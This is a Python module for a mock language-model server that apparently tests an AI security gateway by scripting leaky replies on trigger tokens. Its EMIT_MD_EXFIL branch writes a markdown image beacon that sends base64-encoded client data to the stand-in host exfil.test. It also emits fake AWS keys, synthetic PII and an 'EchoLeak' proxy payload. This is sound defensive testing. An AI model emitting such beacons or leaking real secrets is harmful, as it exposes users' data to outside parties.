"""Trigger parser: turns the request (last user text + model) into a `ReplyScript`.

Triggers (CONTRACTS section 5.6 + Addendum A-56), anywhere in the LAST user message:

    [[EMIT_SECRET]]          AWS-shaped key generated at runtime, split across exactly 3 deltas
    [[EMIT_PII]]             checksum-valid PESEL, PL IBAN, email, phone (generated)
    [[EMIT_MD_EXFIL]]        ![x](http://exfil.test/p.png?d=...) markdown image beacon
    [[EMIT_CANARY]]          AEGIS-CANARY-7f3a91
    [[EMIT_ECHOLEAK_PROXY]]  the harmless AEGIS-TI-022 demo payload (allowlisted image proxy)
    [[TOOL_USE:name:json]]   a tool_use / tool_calls entry (json = arguments object)
    [[LONG:n]]               ~n output tokens of finance-flavoured filler (capped by max_tokens)
    [[SLOW:ms]]              wait ms before the first byte
    [[ERROR:status]]         upstream error in the request's wire format

Default reply: `Mock model received: <last user text, <= 2000 chars>` so placeholders that left the
gateway are visible; `mock-sonnet` adds a templated draft that reuses every `[ENTITY_N]` it saw.
"""

from __future__ import annotations

import base64
import json
import math
import random
import re
from dataclasses import dataclass, field
from typing import Any

from mocks.mock_llm import fakegen

CANARY = "AEGIS-CANARY-7f3a91"
ECHO_PREFIX = "Mock model received: "
ECHO_MAX = 2000

#: ported from feed_service/demo/echoleak-proxy-payload.md (harmless; host per SF-06)
ECHOLEAK_PROXY_PAYLOAD = (
    "Here is your quarterly summary.\n\n"
    "![Q3 revenue chart](https://assets.acme-capital.example/img/proxy"
    "?src=https://cdn.example/chart.png&ref=UECB3F2A9)\n\n"
    "Thanks for using the assistant."
)

_FILLER = (
    "Equity desks rebalanced ahead of the close while credit spreads tightened modestly. "
    "The research team flagged rate-sensitive names and liquidity in mid-cap financials. "
    "Risk limits stayed within appetite and the hedging book rolled forward as planned. "
)

TRIGGER_RE = re.compile(r"\[\[([A-Z_]+)(?::(.*?))?\]\]", re.S)
TOOL_USE_RE = re.compile(r"\[\[TOOL_USE:([A-Za-z0-9_.\-]+):(.*?)\]\](?!\])", re.S)
PLACEHOLDER_RE = re.compile(r"\[(?:[A-Z][A-Z0-9_]*_\d+|REDACTED(?::[A-Z_]+)?)\]")


@dataclass
class ToolUse:
    name: str
    input: dict[str, Any]
    id: str = ""


@dataclass
class ReplyScript:
    """What the mock will answer; wires render it as JSON or SSE."""

    pieces: list[str] = field(default_factory=list)  # text deltas (joined = full text)
    tool_uses: list[ToolUse] = field(default_factory=list)
    delay_ms: int = 0
    error_status: int | None = None
    truncated: bool = False
    triggers: list[str] = field(default_factory=list)

    @property
    def text(self) -> str:
        return "".join(self.pieces)

    def output_chars(self) -> int:
        return len(self.text) + sum(len(json.dumps(t.input)) for t in self.tool_uses)


def tokens(chars: int) -> int:
    """Usage rule (CONTRACTS 5.6): ceil(chars / 4)."""
    return math.ceil(chars / 4) if chars > 0 else 0


# ------------------------------------------------------------------------ request text extraction
def _content_text(content: Any) -> str:
    """Text of an Anthropic/OpenAI content value (str or list of blocks/parts)."""
    if content is None:
        return ""
    if isinstance(content, str):
        return content
    if isinstance(content, list):
        out: list[str] = []
        for block in content:
            if isinstance(block, str):
                out.append(block)
            elif isinstance(block, dict):
                btype = block.get("type")
                if btype in ("text", "input_text"):
                    out.append(str(block.get("text", "")))
                elif btype == "tool_result":
                    out.append(_content_text(block.get("content")))
                elif btype == "tool_use":
                    out.append(json.dumps(block.get("input", {}), ensure_ascii=False))
        return "\n".join(x for x in out if x)
    if isinstance(content, dict):
        return _content_text([content])
    return str(content)


def last_user_text(body: dict[str, Any]) -> str:
    """Text of the last user (or tool) turn of an Anthropic or OpenAI request body."""
    for msg in reversed(body.get("messages") or []):
        if not isinstance(msg, dict):
            continue
        if msg.get("role") in ("user", "tool"):
            return _content_text(msg.get("content"))
    return ""


def all_input_text(body: dict[str, Any]) -> str:
    """System + every message's text (for input_tokens)."""
    parts = [_content_text(body.get("system"))]
    for msg in body.get("messages") or []:
        if isinstance(msg, dict):
            parts.append(_content_text(msg.get("content")))
            for tc in msg.get("tool_calls") or []:
                fn = (tc or {}).get("function") or {}
                parts.append(str(fn.get("arguments", "")))
    return "\n".join(p for p in parts if p)


def input_tokens(body: dict[str, Any]) -> int:
    return tokens(len(all_input_text(body)))


# ------------------------------------------------------------------------------- chunking helpers
def chunk(text: str, size: int | None = None) -> list[str]:
    """Split text into SSE-sized deltas (small for short text so placeholders straddle deltas)."""
    if not text:
        return []
    if size is None:
        size = 12 if len(text) <= 800 else 256
    return [text[i : i + size] for i in range(0, len(text), size)]


def _int_arg(arg: str | None, default: int) -> int:
    try:
        return max(0, int(str(arg).strip()))
    except (TypeError, ValueError):
        return default


def _draft(placeholders: list[str]) -> str:
    person = next((p for p in placeholders if p.startswith("[PERSON")), "[PERSON_1]")
    others = [p for p in placeholders if p != person]
    lines = [f"Draft: Dear {person},", ""]
    if others:
        lines.append("We have confirmed the following details on file: " + ", ".join(others) + ".")
    else:
        lines.append("Thank you for your message; we have reviewed your account.")
    lines += ["Please reply if anything needs correcting.", "", "Kind regards,", "Acme Capital"]
    return "\n".join(lines)


# ----------------------------------------------------------------------------------------- parser
def build_script(
    body: dict[str, Any],
    rng: random.Random,
    *,
    tool_id: str = "toolu_mock_1",
) -> ReplyScript:
    """Build the reply for a request body (either wire)."""
    model = str(body.get("model") or "mock-echo")
    max_tokens = body.get("max_tokens") or body.get("max_completion_tokens")
    user = last_user_text(body)
    script = ReplyScript()

    triggers = [(m.group(1), m.group(2)) for m in TRIGGER_RE.finditer(user)]
    script.triggers = [t for t, _ in triggers]
    for name, arg in triggers:
        if name == "SLOW":
            script.delay_ms = min(_int_arg(arg, 0), 120_000)
        elif name == "ERROR":
            script.error_status = _int_arg(arg, 500) or 500

    echo = user if len(user) <= ECHO_MAX else user[: ECHO_MAX - 1] + "…"
    script.pieces += chunk(ECHO_PREFIX + echo)

    if model.startswith("mock-sonnet") or "sonnet" in model:
        seen: list[str] = []
        for p in PLACEHOLDER_RE.findall(user):
            if p not in seen:
                seen.append(p)
        script.pieces += chunk("\n\n" + _draft(seen))

    for name, arg in triggers:
        if name == "EMIT_SECRET":
            key = fakegen.aws_access_key(rng)
            script.pieces += chunk("\n\nSure. The deploy key in config/prod.env is ")
            script.pieces += [key[:7], key[7:14], key[14:]]  # exactly 3 deltas carry the key
            script.pieces += chunk(" - rotate it after use.")
        elif name == "EMIT_PII":
            who = fakegen.person(rng)
            text = (
                f"\n\nClient record: {who}, PESEL {fakegen.pesel(rng)}, "
                f"IBAN {fakegen.pl_iban(rng)}, email {fakegen.email(rng, who)}, "
                f"phone {fakegen.phone(rng)}."
            )
            script.pieces += chunk(text)
        elif name == "EMIT_MD_EXFIL":
            blob = base64.urlsafe_b64encode(
                f"client={fakegen.person(rng)};acct={fakegen.pl_iban(rng)}".encode()
            ).decode().rstrip("=")
            script.pieces += chunk(
                f"\n\nSummary ready. ![x](http://exfil.test/p.png?d={blob}) Anything else?"
            )
        elif name == "EMIT_CANARY":
            script.pieces += chunk(f"\n\nInternal reference: {CANARY}")
        elif name == "EMIT_ECHOLEAK_PROXY":
            script.pieces += chunk("\n\n" + ECHOLEAK_PROXY_PAYLOAD)
        elif name == "LONG":
            n = _int_arg(arg, 100)
            want_chars = n * 4
            reps = _FILLER * (want_chars // len(_FILLER) + 1)
            script.pieces += chunk("\n\n" + reps[: max(0, want_chars - 2)])

    for m in TOOL_USE_RE.finditer(user):
        name, raw = m.group(1), m.group(2).strip()
        try:
            args = json.loads(raw) if raw else {}
        except json.JSONDecodeError:
            args = {"raw": raw}
        if not isinstance(args, dict):
            args = {"value": args}
        idx = len(script.tool_uses) + 1
        script.tool_uses.append(ToolUse(name=name, input=args, id=f"{tool_id}_{idx}"))

    # honour max_tokens (output tokens = ceil(chars/4)); tool calls are never cut
    if isinstance(max_tokens, int) and max_tokens > 0:
        budget = max_tokens * 4
        text = script.text
        if len(text) > budget:
            script.pieces = chunk(text[:budget])
            script.truncated = True
    return script


__all__ = [
    "CANARY",
    "ECHOLEAK_PROXY_PAYLOAD",
    "ECHO_PREFIX",
    "PLACEHOLDER_RE",
    "ReplyScript",
    "ToolUse",
    "all_input_text",
    "build_script",
    "chunk",
    "input_tokens",
    "last_user_text",
    "tokens",
]
